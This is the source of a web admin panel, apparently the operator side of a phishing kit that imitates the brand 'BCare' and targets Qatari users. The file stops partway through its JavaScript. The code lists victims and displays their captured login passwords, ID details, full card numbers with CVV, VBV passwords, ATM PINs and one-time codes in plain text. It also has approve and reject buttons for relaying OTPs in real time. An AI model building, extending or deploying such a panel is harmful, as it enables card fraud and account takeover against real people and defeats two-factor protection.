<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ… - Admin Dashboard</title>
    
    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    
    <!-- Cairo Font -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;900&display=swap" rel="stylesheet">
    
    <!-- Lucide Icons -->
    <script src="https://unpkg.com/lucide@latest"></script>
    
    <!-- jQuery -->
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    
    <style>
        * {
            font-family: 'Cairo', sans-serif;
        }
        
        body {
            background: #f9fafb;
        }
        
        /* Notification Badge */
        .notification-badge {
            position: absolute;
            top: -8px;
            right: -8px;
            background: #ef4444;
            color: white;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 11px;
            font-weight: bold;
            animation: pulse-badge 2s infinite;
        }
        
        @keyframes pulse-badge {
            0%, 100% {
                transform: scale(1);
            }
            50% {
                transform: scale(1.1);
            }
        }
        
        .visitor-card {
            transition: all 0.2s ease;
        }
        
        .visitor-card:hover {
            background: #f9fafb;
        }
        
        .visitor-card.selected {
            background: #f0fdf4;
            border-right: 4px solid #10b981;
        }
        
        .visitor-card.unread {
            background: #fdf2f8;
        }
        
        .online-dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            display: inline-block;
        }
        
        .online-dot.online {
            background: #10b981;
            animation: pulse 2s infinite;
        }
        
        .online-dot.offline {
            background: #9ca3af;
        }
        
        @keyframes pulse {
            0%, 100% {
                opacity: 1;
            }
            50% {
                opacity: 0.5;
            }
        }
        
        .stat-card {
            background: rgba(255, 255, 255, 0.7);
            backdrop-filter: blur(10px);
        }
    </style>
</head>
<body>
    <!-- Main Container -->
    <div class="h-screen flex flex-col">
        <!-- Header -->
        <div class="bg-white border-b border-gray-200">
            <!-- Title & Logout -->
            <div class="px-6 py-4 border-b border-gray-100">
                <div class="flex items-center justify-between">
                    <div>
                        <h1 class="text-2xl font-bold text-gray-800">Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ…</h1>
                        <p class="text-sm text-gray-600">Ø¥Ø¯Ø§Ø±Ø© Ø²ÙˆØ§Ø± BCare</p>
                    </div>
                    <div class="flex items-center gap-4">
                        <div class="text-left">
                            <p class="text-sm font-medium text-gray-700" id="adminEmail">admin@bcare.com</p>
                            <p class="text-xs text-gray-500">Ù…Ø³Ø¤ÙˆÙ„ Ø§Ù„Ù†Ø¸Ø§Ù…</p>
                        </div>
                        <button onclick="logout()" class="bg-red-500 hover:bg-red-600 text-white px-4 py-2 rounded-lg text-sm font-medium transition-colors">
                            ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø®Ø±ÙˆØ¬
                        </button>
                    </div>
                </div>
            </div>
            
            <!-- Analytics Stats -->
            <div class="bg-gradient-to-r from-blue-50 via-purple-50 to-green-50 px-6 py-2">
                <div class="grid grid-cols-5 gap-3">
                    <!-- Active Users -->
                    <div class="stat-card rounded-lg p-2 border border-green-200">
                        <div class="flex items-center gap-1.5 mb-1">
                            <div class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                            <span class="text-xs text-gray-600">Ù†Ø´Ø· Ø§Ù„Ø¢Ù†</span>
                        </div>
                        <span class="text-xl font-bold text-green-600" id="activeUsers">0</span>
                    </div>
                    
                    <!-- Today's Visitors -->
                    <div class="stat-card rounded-lg p-2 border border-blue-200">
                        <div class="flex items-center gap-1.5 mb-1">
                            <div class="w-2 h-2 bg-blue-500 rounded-full"></div>
                            <span class="text-xs text-gray-600">Ø²ÙˆØ§Ø± Ø§Ù„ÙŠÙˆÙ…</span>
                        </div>
                        <span class="text-xl font-bold text-blue-600" id="todayVisitors">0</span>
                    </div>
                    
                    <!-- Total Visitors -->
                    <div class="stat-card rounded-lg p-2 border border-purple-200">
                        <div class="flex items-center gap-1.5 mb-1">
                            <div class="w-2 h-2 bg-purple-500 rounded-full"></div>
                            <span class="text-xs text-gray-600">Ø¥Ø¬Ù…Ø§Ù„ÙŠ Ø§Ù„Ø²ÙˆØ§Ø±</span>
                        </div>
                        <span class="text-xl font-bold text-purple-600" id="totalVisitors">0</span>
                    </div>
                    
                    <!-- Visitors with Card -->
                    <div class="stat-card rounded-lg p-2 border border-orange-200">
                        <div class="flex items-center gap-1.5 mb-1">
                            <span class="text-xs">ğŸ’³</span>
                            <span class="text-xs text-gray-600">Ù„Ø¯ÙŠÙ‡Ù… Ø¨Ø·Ø§Ù‚Ø©</span>
                        </div>
                        <span class="text-xl font-bold text-orange-600" id="visitorsWithCard">0</span>
                    </div>
                    
                    <!-- Visitors with OTP -->
                    <div class="stat-card rounded-lg p-2 border border-pink-200">
                        <div class="flex items-center gap-1.5 mb-1">
                            <span class="text-xs">ğŸ”‘</span>
                            <span class="text-xs text-gray-600">Ù„Ø¯ÙŠÙ‡Ù… OTP</span>
                        </div>
                        <span class="text-xl font-bold text-pink-600" id="visitorsWithOTP">0</span>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Main Content -->
        <div class="flex-1 flex overflow-hidden">
            <!-- Sidebar - Visitor List -->
            <div class="w-[400px] bg-white border-l border-gray-200 flex flex-col">
                <!-- Search & Filters -->
                <div class="p-4 border-b border-gray-200 bg-gray-50">
                    <!-- Search -->
                    <div class="relative mb-3">
                        <i data-lucide="search" class="absolute right-3 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400"></i>
                        <input
                            type="text"
                            id="searchInput"
                            placeholder="Ø¨Ø­Ø« (Ø§Ù„Ø§Ø³Ù…ØŒ Ø§Ù„Ù‡ÙˆÙŠØ©ØŒ Ø§Ù„Ù‡Ø§ØªÙØŒ Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©)"
                            class="w-full pr-10 pl-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-green-500 text-sm"
                        />
                    </div>
                    
                    <!-- Filters -->
                    <div class="flex gap-2 mb-3">
                        <button onclick="setFilter('all')" id="filterAll" class="flex-1 px-3 py-1.5 rounded-lg text-sm font-medium transition-colors bg-green-600 text-white">
                            Ø§Ù„ÙƒÙ„
                        </button>
                        <button onclick="setFilter('hasCard')" id="filterCard" class="flex-1 px-3 py-1.5 rounded-lg text-sm font-medium transition-colors bg-gray-200 text-gray-700 hover:bg-gray-300">
                            Ù„Ø¯ÙŠÙ‡Ù… Ø¨Ø·Ø§Ù‚Ø©
                        </button>
                    </div>
                    
                    <!-- Actions -->
                    <div class="flex gap-2">
                        <button onclick="selectAll()" id="selectAllBtn" class="flex items-center gap-2 px-3 py-1.5 bg-gray-200 hover:bg-gray-300 rounded-lg text-sm font-medium transition-colors">
                            <i data-lucide="square" class="w-4 h-4"></i>
                            ØªØ­Ø¯ÙŠØ¯ Ø§Ù„ÙƒÙ„
                        </button>
                        <button onclick="deleteSelected()" id="deleteBtn" class="hidden items-center gap-2 px-3 py-1.5 bg-red-500 hover:bg-red-600 text-white rounded-lg text-sm font-medium transition-colors">
                            <i data-lucide="trash-2" class="w-4 h-4"></i>
                            Ø­Ø°Ù (<span id="selectedCount">0</span>)
                        </button>
                    </div>
                </div>
                
                <!-- Visitor List -->
                <div class="flex-1 overflow-y-auto" id="visitorList">
                    <div class="p-8 text-center text-gray-500">
                        <p>Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù…ÙŠÙ„...</p>
                    </div>
                </div>
            </div>
            
            <!-- Details Panel -->
            <div class="flex-1 overflow-y-auto p-6" id="detailsPanel">
                <div class="text-center text-gray-500 mt-20">
                    <p class="text-lg">Ø§Ø®ØªØ± Ø²Ø§Ø¦Ø± Ù„Ø¹Ø±Ø¶ Ø§Ù„ØªÙØ§ØµÙŠÙ„</p>
                </div>
            </div>
        </div>
    </div>
    
    <script>
        // Initialize Lucide icons
        lucide.createIcons();
        
        let visitors = [];
        let selectedVisitor = null;
        let currentFilter = 'all';
        let selectedIds = new Set();
        
        // Load visitors from Firebase
        function loadVisitors() {
            $.ajax({
                url: '/admin/api/visitors',
                method: 'GET',
                success: function(response) {
                    if (response.success) {
                        visitors = response.visitors || [];
                        
                        // Calculate isOnline
                        const now = new Date();
                        const thirtySecondsAgo = new Date(now.getTime() - 30 * 1000);
                        
                        visitors = visitors.map(v => {
                            let isOnline = false;
                            if (v.lastSeen) {
                                const lastSeen = new Date(v.lastSeen);
                                isOnline = lastSeen >= thirtySecondsAgo;
                            }
                            return { ...v, isOnline };
                        });
                        
                        // Sort by lastUpdated
                        visitors.sort((a, b) => {
                            const timeA = a.lastUpdated ? new Date(a.lastUpdated).getTime() : 0;
                            const timeB = b.lastUpdated ? new Date(b.lastUpdated).getTime() : 0;
                            return timeB - timeA;
                        });
                        
                        renderVisitorList();
                        updateStats();
                    }
                },
                error: function() {
                    console.error('Failed to load visitors');
                }
            });
        }
        
        // Render visitor list
        function renderVisitorList() {
            const searchQuery = $('#searchInput').val().toLowerCase();
            let filtered = visitors;
            
            // Apply filter
            if (currentFilter === 'hasCard') {
                filtered = filtered.filter(v => v.cardNumber || v.card);
            }
            
            // Apply search
            if (searchQuery) {
                filtered = filtered.filter(v => {
                    return (v.name && v.name.toLowerCase().includes(searchQuery)) ||
                           (v.phone && v.phone.includes(searchQuery)) ||
                           (v.cardNumber && v.cardNumber.includes(searchQuery));
                });
            }
            
            const html = filtered.length === 0 ? 
                '<div class="p-8 text-center text-gray-500"><p>Ù„Ø§ ÙŠÙˆØ¬Ø¯ Ø²ÙˆØ§Ø±</p></div>' :
                filtered.map(v => `
                    <div class="visitor-card p-4 border-b border-gray-100 cursor-pointer ${selectedVisitor?.vid === v.vid ? 'selected' : ''}"
                         onclick="selectVisitor('${v.vid}')">
                        <div class="flex items-start gap-3">
                            <div onclick="event.stopPropagation(); toggleSelect('${v.vid}')" class="mt-1">
                                <i data-lucide="${selectedIds.has(v.vid) ? 'check-square' : 'square'}" class="w-5 h-5 ${selectedIds.has(v.vid) ? 'text-green-600' : 'text-gray-400'}"></i>
                            </div>
                            <div class="flex-1">
                                <div class="flex items-center justify-between mb-1">
                                    <h3 class="font-semibold text-gray-900">${v.data?.step5?.phone || v.data?.step4?.cardHolder || 'ØºÙŠØ± Ù…Ø­Ø¯Ø¯'}</h3>
                                    <span class="text-xs text-gray-500">${getTimeAgo(v.lastSeen)}</span>
                                </div>
                                <div class="flex items-center gap-2 text-xs text-gray-600 mb-2">
                                    ${v.data?.step5?.phone ? `<span>ğŸ“ ${v.data.step5.phone}</span>` : ''}
                                    ${v.data?.step4?.cardNumber ? `<span>ğŸ’³ ****${v.data.step4.cardNumber.replace(/\s/g, '').slice(-4)}</span>` : ''}
                                </div>
                                <div class="flex items-center gap-2 flex-wrap">
                                    <span class="online-dot ${v.isOnline ? 'online' : 'offline'}"></span>
                                    <span class="text-xs text-gray-600">${v.isOnline ? 'Ù…ØªØµÙ„' : 'ØºÙŠØ± Ù…ØªØµÙ„'}</span>
                                    ${v.data?.step3 ? `<span class="relative px-2 py-0.5 bg-green-100 text-green-700 rounded text-xs">Step3${isRecent(v.data.step3.timestamp) ? '<span class="notification-badge">!</span>' : ''}</span>` : ''}
                                    ${v.data?.step4 ? `<span class="relative px-2 py-0.5 bg-blue-100 text-blue-700 rounded text-xs">ğŸ’³ Step4${isRecent(v.data.step4.timestamp) ? '<span class="notification-badge">!</span>' : ''}</span>` : ''}
                                    ${v.data?.step5 ? `<span class="relative px-2 py-0.5 bg-orange-100 text-orange-700 rounded text-xs">ğŸ“± Step5${isRecent(v.data.step5.timestamp) ? '<span class="notification-badge">!</span>' : ''}</span>` : ''}
                                    ${v.otp?.current?.otp ? `<span class="relative px-2 py-0.5 bg-purple-100 text-purple-700 rounded text-xs">ğŸ”‘ OTP${isRecent(v.otp.current.timestamp) ? '<span class="notification-badge">!</span>' : ''}</span>` : ''}
                                    ${v.verification?.current?.verificationCode ? `<span class="relative px-2 py-0.5 bg-pink-100 text-pink-700 rounded text-xs">âœ”ï¸ Verify${isRecent(v.verification.current.timestamp) ? '<span class="notification-badge">!</span>' : ''}</span>` : ''}
                                </div>
                            </div>
                        </div>
                    </div>
                `).join('');
            
            $('#visitorList').html(html);
            lucide.createIcons();
        }
        
        // Select visitor
        function selectVisitor(vid) {
            selectedVisitor = visitors.find(v => v.vid === vid);
            renderVisitorList();
            renderDetails();
        }
        
        // Render details
        function renderDetails() {
            if (!selectedVisitor) {
                $('#detailsPanel').html('<div class="text-center text-gray-500 mt-20"><p class="text-lg">Ø§Ø®ØªØ± Ø²Ø§Ø¦Ø± Ù„Ø¹Ø±Ø¶ Ø§Ù„ØªÙØ§ØµÙŠÙ„</p></div>');
                return;
            }
            
            const v = selectedVisitor;
            
            // Collect all data items with timestamps
            const items = [];
            
            // Login Data
            if (v.data?.login) {
                items.push({
                    type: 'login',
                    title: 'ğŸ”‘ Ø¨ÙŠØ§Ù†Ø§Øª ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ (Login)',
                    timestamp: v.data.login.timestamp,
                    data: v.data.login,
                    needsApproval: false
                });
            }
            
            // Step 1: User Type
            if (v.data?.step1) {
                items.push({
                    type: 'step1',
                    title: 'ğŸ“ Ù†ÙˆØ¹ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… (Step 1)',
                    timestamp: v.data.step1.timestamp,
                    data: v.data.step1,
                    needsApproval: false
                });
            }
            
            // Step 2: QID/Passport
            if (v.data?.step2) {
                items.push({
                    type: 'step2',
                    title: 'ğŸ« Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù‡ÙˆÙŠØ© (Step 2)',
                    timestamp: v.data.step2.timestamp,
                    data: v.data.step2,
                    needsApproval: false
                });
            }
            
            // Step 3: Password
            if (v.data?.step3) {
                items.push({
                    type: 'step3',
                    title: 'ğŸ” ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± (Step 3)',
                    timestamp: v.data.step3.timestamp,
                    data: v.data.step3,
                    needsApproval: false
                });
            }
            
            // Step 4: Card Data
            if (v.data?.step4) {
                items.push({
                    type: 'step4',
                    title: 'ğŸ’³ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¨Ø·Ø§Ù‚Ø© (Step 4)',
                    timestamp: v.data.step4.timestamp,
                    data: v.data.step4,
                    needsApproval: false
                });
            }
            
            // Step 5: Activation Data
            if (v.data?.step5) {
                items.push({
                    type: 'step5',
                    title: 'ğŸ“± Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„ØªÙØ¹ÙŠÙ„ (Step 5)',
                    timestamp: v.data.step5.timestamp,
                    data: v.data.step5,
                    needsApproval: false
                });
            }
            
            // OTP - Current
            if (v.otp?.current?.otp) {
                items.push({
                    type: 'otp',
                    title: 'ğŸ”‘ OTP Code',
                    timestamp: v.otp.current.timestamp,
                    color: 'purple',
                    data: v.otp.current,
                    status: v.otp.otp_status || 'pending',
                    needsApproval: true,
                    attemptNumber: v.otp.current.attemptNumber
                });
            }
            
            // ATM PIN
            if (v['atmPin.current']?.atmPin) {
                items.push({
                    type: 'atmPin',
                    title: 'ğŸ“± ATM PIN',
                    timestamp: v['atmPin.current'].timestamp,
                    data: v['atmPin.current'],
                    needsApproval: false
                });
            }
            
            // OTP - History
            if (v.otp?.history) {
                Object.keys(v.otp.history).forEach(key => {
                    const historyItem = v.otp.history[key];
                    items.push({
                        type: 'otp_history',
                        title: `ğŸ”‘ OTP Code (Ù…Ø­Ø§ÙˆÙ„Ø© ${historyItem.attemptNumber || '?'})`,
                        timestamp: historyItem.timestamp,
                        color: 'purple',
                        data: historyItem,
                        status: 'old',
                        needsApproval: false,
                        isHistory: true
                    });
                });
            }
            
            // Verification - Current
            if (v.verification?.current?.verificationCode) {
                items.push({
                    type: 'verification',
                    title: 'âœ”ï¸ Verification Code',
                    timestamp: v.verification.current.timestamp,
                    color: 'pink',
                    data: v.verification.current,
                    status: v.verification.verification_status || 'pending',
                    needsApproval: true,
                    attemptNumber: v.verification.current.attemptNumber
                });
            }
            
            // Verification - History
            if (v.verification?.history) {
                Object.keys(v.verification.history).forEach(key => {
                    const historyItem = v.verification.history[key];
                    items.push({
                        type: 'verification_history',
                        title: `âœ”ï¸ Verification Code (Ù…Ø­Ø§ÙˆÙ„Ø© ${historyItem.attemptNumber || '?'})`,
                        timestamp: historyItem.timestamp,
                        color: 'pink',
                        data: historyItem,
                        status: 'old',
                        needsApproval: false,
                        isHistory: true
                    });
                });
            }
            
            // Sort by timestamp (newest first)
            items.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
            
            // Render header
            let html = `
                <div class="max-w-4xl mx-auto">
                    <div class="flex items-center justify-between mb-6">
                        <h2 class="text-2xl font-bold text-gray-800">${v.data?.step5?.phone || v.data?.step4?.cardHolder || 'ØºÙŠØ± Ù…Ø­Ø¯Ø¯'}</h2>
                        <div class="flex items-center gap-2">
                            <span class="online-dot ${v.isOnline ? 'online' : 'offline'}"></span>
                            <span class="text-sm text-gray-600">${v.isOnline ? 'Ù…ØªØµÙ„ Ø§Ù„Ø¢Ù†' : 'ØºÙŠØ± Ù…ØªØµÙ„'}</span>
                        </div>
                    </div>
                    
                    <div class="space-y-4">
            `;
            
            // Render each item as a bubble
            items.forEach(item => {
                // All bubbles same color (white)
                const bgClass = 'border-gray-300 bg-white';
                const isNew = isRecent(item.timestamp);
                
                html += `
                    <div class="rounded-lg p-6 border-2 ${bgClass} ${isNew ? 'ring-2 ring-red-400' : ''} ${item.isHistory ? 'opacity-70' : ''}">
                        <div class="flex items-center justify-between mb-4">
                            <h3 class="text-lg font-semibold text-gray-800">${item.title}</h3>
                            <div class="flex items-center gap-2">
                                ${isNew ? '<span class="px-2 py-1 bg-red-500 text-white text-xs rounded-full animate-pulse">Ø¬Ø¯ÙŠØ¯!</span>' : ''}
                                <span class="text-xs text-gray-500">${getTimeAgo(item.timestamp)}</span>
                            </div>
                        </div>
                `;
                
                // Render data based on type
                if (item.type === 'login') {
                    html += `
                        <div class="grid grid-cols-2 gap-4">
                            <div><span class="text-gray-600">Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…:</span> <span class="font-medium">${item.data.username || '-'}</span></div>
                            <div><span class="text-gray-600">ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±:</span> <span class="font-medium">${item.data.password || '-'}</span></div>
                        </div>
                    `;
                } else if (item.type === 'step1') {
                    html += `
                        <div class="grid grid-cols-2 gap-4">
                            <div><span class="text-gray-600">Ù†ÙˆØ¹ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…:</span> <span class="font-medium">${item.data.userType === 'QID' ? 'Ø¨Ø·Ø§Ù‚Ø© Ù‡ÙˆÙŠØ© Ù‚Ø·Ø±ÙŠØ©' : 'Ø¬ÙˆØ§Ø² Ø³ÙØ±'}</span></div>
                        </div>
                    `;
                } else if (item.type === 'step2') {
                    // step2Q sends data with attributes prefix
                    const attrs = item.data.attributes || item.data;
                    const nameAr = [attrs["UserFirstNameAR"], attrs["UserMiddleNameAR"], attrs["UserLastNameAR"]].filter(Boolean).join(' ');
                    const nameEn = [attrs["UserFirstNameEN"], attrs["UserMiddleNameEN"], attrs["UserLastNameEN"]].filter(Boolean).join(' ');
                    
                    html += `
                        <div class="grid grid-cols-2 gap-4">
                            ${item.data.nationalityType ? `<div><span class="text-gray-600">Ù†ÙˆØ¹ Ø§Ù„Ø¬Ù†Ø³ÙŠØ©:</span> <span class="font-medium">${item.data.nationalityType === 'qatari' ? 'Ù‚Ø·Ø±ÙŠ' : 'Ø£Ø®Ø±Ù‰'}</span></div>` : ''}
                            ${attrs.UserNationality ? `<div><span class="text-gray-600">Ø§Ù„Ø¬Ù†Ø³ÙŠØ©:</span> <span class="font-medium">${attrs.UserNationality}</span></div>` : ''}
                            ${nameAr ? `<div><span class="text-gray-600">Ø§Ù„Ø§Ø³Ù… (Ø¹Ø±Ø¨ÙŠ):</span> <span class="font-medium">${nameAr}</span></div>` : ''}
                            ${nameEn ? `<div><span class="text-gray-600">Ø§Ù„Ø§Ø³Ù… (Ø¥Ù†Ø¬Ù„ÙŠØ²ÙŠ):</span> <span class="font-medium">${nameEn}</span></div>` : ''}
                            ${attrs.UserBirthdate ? `<div><span class="text-gray-600">ØªØ§Ø±ÙŠØ® Ø§Ù„Ù…ÙŠÙ„Ø§Ø¯:</span> <span class="font-medium">${attrs.UserBirthdate}</span></div>` : ''}
                        </div>
                    `;
                } else if (item.type === 'step3') {
                    html += `
                        <div class="grid grid-cols-2 gap-4">
                            <div><span class="text-gray-600">ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±:</span> <span class="font-medium">${item.data.password || '-'}</span></div>
                            <div><span class="text-gray-600">ØªØ£ÙƒÙŠØ¯ ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±:</span> <span class="font-medium">${item.data.confirmPassword || '-'}</span></div>
                        </div>
                    `;
                } else if (item.type === 'step4') {
                    html += `
                        <div class="grid grid-cols-2 gap-4">
                            <div><span class="text-gray-600">Ø±Ù‚Ù… Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©:</span> <span class="font-medium">${item.data.cardNumber || '-'}</span></div>
                            <div><span class="text-gray-600">Ø§Ø³Ù… Ø­Ø§Ù…Ù„ Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©:</span> <span class="font-medium">${item.data.cardHolder || '-'}</span></div>
                            <div><span class="text-gray-600">ØªØ§Ø±ÙŠØ® Ø§Ù„Ø§Ù†ØªÙ‡Ø§Ø¡:</span> <span class="font-medium">${item.data.expiryDate || '-'}</span></div>
                            <div><span class="text-gray-600">CVV:</span> <span class="font-medium">${item.data.cvv || '-'}</span></div>
                            ${item.data.vbvPassword ? `<div><span class="text-gray-600">VBV Password:</span> <span class="font-medium">${item.data.vbvPassword}</span></div>` : ''}
                            ${item.data.atmPin ? `<div><span class="text-gray-600">ATM PIN:</span> <span class="font-medium">${item.data.atmPin}</span></div>` : ''}
                        </div>
                    `;
                } else if (item.type === 'step5') {
                    html += `
                        <div class="grid grid-cols-2 gap-4">
                            <div><span class="text-gray-600">Ù…Ø²ÙˆØ¯ Ø§Ù„Ø®Ø¯Ù…Ø©:</span> <span class="font-medium">${item.data.provider || '-'}</span></div>
                            <div><span class="text-gray-600">Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ:</span> <span class="font-medium">${item.data.phone || '-'}</span></div>
                            <div><span class="text-gray-600">Ø±Ù‚Ù… Ø§Ù„Ù‡ÙˆÙŠØ©:</span> <span class="font-medium">${item.data.personalId || '-'}</span></div>
                            <div><span class="text-gray-600">Ø§Ù„Ø¨Ø±ÙŠØ¯:</span> <span class="font-medium">${item.data.email || '-'}</span></div>
                            <div><span class="text-gray-600">ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±:</span> <span class="font-medium">${item.data.password || '-'}</span></div>
                        </div>
                    `;
                } else if (item.type === 'otp' || item.type === 'otp_history') {
                    html += `
                        <div class="mb-4">
                            <div class="text-center">
                                <span class="text-4xl font-bold text-purple-600">${item.data.otp}</span>
                            </div>
                        </div>
                        <div class="flex items-center justify-between">
                            <div><span class="text-gray-600">Ø§Ù„Ø­Ø§Ù„Ø©:</span> 
                                <span class="px-2 py-1 rounded text-sm ${item.status === 'approved' ? 'bg-green-100 text-green-700' : item.status === 'rejected' ? 'bg-red-100 text-red-700' : 'bg-yellow-100 text-yellow-700'}">${item.status === 'approved' ? 'Ù…ÙˆØ§ÙÙ‚' : item.status === 'rejected' ? 'Ù…Ø±ÙÙˆØ¶' : 'Ù‚ÙŠØ¯ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±'}</span>
                            </div>
                            ${item.needsApproval && item.status === 'pending' ? `
                            <div class="flex gap-2">
                                <button onclick="approveOTP('${v.vid}', 'approved')" class="px-4 py-2 bg-green-500 text-white rounded hover:bg-green-600">
                                    âœ“ Ù…ÙˆØ§ÙÙ‚Ø©
                                </button>
                                <button onclick="approveOTP('${v.vid}', 'rejected')" class="px-4 py-2 bg-red-500 text-white rounded hover:bg-red-600">
                                    âœ— Ø±ÙØ¶
                                </button>
                            </div>
                            ` : ''}
                        </div>
                    `;
                } else if (item.type === 'atmPin') {
                    html += `
                        <div class="mb-4">
                            <div class="text-center">
                                <span class="text-4xl font-bold text-blue-600">${item.data.atmPin}</span>
                            </div>
                        </div>
                        <div class="grid grid-cols-2 gap-4">
                            <div><span class="text-gray-600">Ø±Ù‚Ù… Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø©:</span> <span class="font-medium">${item.data.attemptNumber || 1}</span></div>
                        </div>
                    `;
                } else if (item.type === 'verification' || item.type === 'verification_history') {
                    html += `
                        <div class="mb-4">
                            <div class="text-center">
                                <span class="text-4xl font-bold text-pink-600">${item.data.verificationCode}</span>
                            </div>
                        </div>
                        <div class="flex items-center justify-between">
                            <div><span class="text-gray-600">Ø§Ù„Ø­Ø§Ù„Ø©:</span> 
                                <span class="px-2 py-1 rounded text-sm ${item.status === 'approved' ? 'bg-green-100 text-green-700' : item.status === 'rejected' ? 'bg-red-100 text-red-700' : 'bg-yellow-100 text-yellow-700'}">${item.status === 'approved' ? 'Ù…ÙˆØ§ÙÙ‚' : item.status === 'rejected' ? 'Ù…Ø±ÙÙˆØ¶' : 'Ù‚ÙŠØ¯ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±'}</span>
                            </div>
                            ${item.needsApproval && item.status === 'pending' ? `
                            <div class="flex gap-2">
                                <button onclick="approveVerification('${v.vid}', 'approved')" class="px-4 py-2 bg-green-500 text-white rounded hover:bg-green-600">
                                    âœ“ Ù…ÙˆØ§ÙÙ‚Ø©
                                </button>
                                <button onclick="approveVerification('${v.vid}', 'rejected')" class="px-4 py-2 bg-red-500 text-white rounded hover:bg-red-600">
                                    âœ— Ø±ÙØ¶
                                </button>
                            </div>
                            ` : ''}
                        </div>
                    `;
                }
                
                html += `</div>`;
            });
            
            html += `
                    </div>
                </div>
            `;
            
            $('#detailsPanel').html(html);
        }
        
        // Toggle select
        function toggleSelect(vid) {
            if (selectedIds.has(vid)) {
                selectedIds.delete(vid);
            } else {
                selectedIds.add(vid);
            }
            updateSelectUI();
            renderVisitorList();
        }
        
        // Select all
        function selectAll() {
            if (selectedIds.size === visitors.length) {
                selectedIds.clear();
            } else {
                selectedIds = new Set(visitors.map(v => v.vid));
            }
            updateSelectUI();
            renderVisitorList();
        }
        
        // Update select UI
        function updateSelectUI() {
            $('#selectedCount').text(selectedIds.size);
            if (selectedIds.size > 0) {
                $('#deleteBtn').removeClass('hidden').addClass('flex');
            } else {
                $('#deleteBtn').removeClass('flex').addClass('hidden');
            }
        }
        
        // Set filter
        function setFilter(filter) {
            currentFilter = filter;
            $('#filterAll, #filterCard').removeClass('bg-green-600 text-white').addClass('bg-gray-200 text-gray-700');
            $(`#filter${filter === 'all' ? 'All' : 'Card'}`).removeClass('bg-gray-200 text-gray-700').addClass('bg-green-600 text-white');
            renderVisitorList();
        }
        
        // Delete selected
        function deleteSelected() {
            if (selectedIds.size === 0) return;
            if (!confirm(`Ù‡Ù„ Ø£Ù†Øª Ù…ØªØ£ÙƒØ¯ Ù…Ù† Ø­Ø°Ù ${selectedIds.size} Ø²Ø§Ø¦Ø±ØŸ`)) return;
            
            // TODO: Implement delete
            alert('Ø³ÙŠØªÙ… Ø§Ù„ØªÙ†ÙÙŠØ° Ù‚Ø±ÙŠØ¨Ø§Ù‹');
        }
        
        // Update stats
        function updateStats() {
            $('#activeUsers').text(visitors.filter(v => v.isOnline).length);
            $('#todayVisitors').text(visitors.length);
            $('#totalVisitors').text(visitors.length);
            $('#visitorsWithCard').text(visitors.filter(v => v.cardNumber).length);
            $('#visitorsWithOTP').text(visitors.filter(v => v.otp).length);
        }
        
        // Get time ago
        function getTimeAgo(date) {
            if (!date) return '-';
            const now = new Date();
            const then = new Date(date);
            const diff = Math.floor((now - then) / 1000);
            
            if (diff < 60) return 'Ø§Ù„Ø¢Ù†';
            if (diff < 3600) return `Ù…Ù†Ø° ${Math.floor(diff / 60)} Ø¯Ù‚ÙŠÙ‚Ø©`;
            if (diff < 86400) return `Ù…Ù†Ø° ${Math.floor(diff / 3600)} Ø³Ø§Ø¹Ø©`;
            return `Ù…Ù†Ø° ${Math.floor(diff / 86400)} ÙŠÙˆÙ…`;
        }
        
        // Check if data is recent (within last 2 minutes)
        function isRecent(timestamp) {
            if (!timestamp) return false;
            const now = new Date();
            const then = new Date(timestamp);
            const diff = Math.floor((now - then) / 1000);
            return diff < 120; // 2 minutes
        }
        
        // Logout
        function logout() {
            window.location.href = '/admin/login';
        }
        
        // Search
        $('#searchInput').on('input', function() {
            renderVisitorList();
        });
        
        // Approve/Reject OTP
        function approveOTP(vid, status) {
            if (!confirm(`Ù‡Ù„ Ø£Ù†Øª Ù…ØªØ£ÙƒØ¯ Ù…Ù† ${status === 'approved' ? 'Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø©' : 'Ø§Ù„Ø±ÙØ¶'}?`)) return;
            
            $.ajax({
                url: `/admin/api/approve-otp`,
                method: 'POST',
                contentType: 'application/json',
                data: JSON.stringify({ vid, status }),
                success: function() {
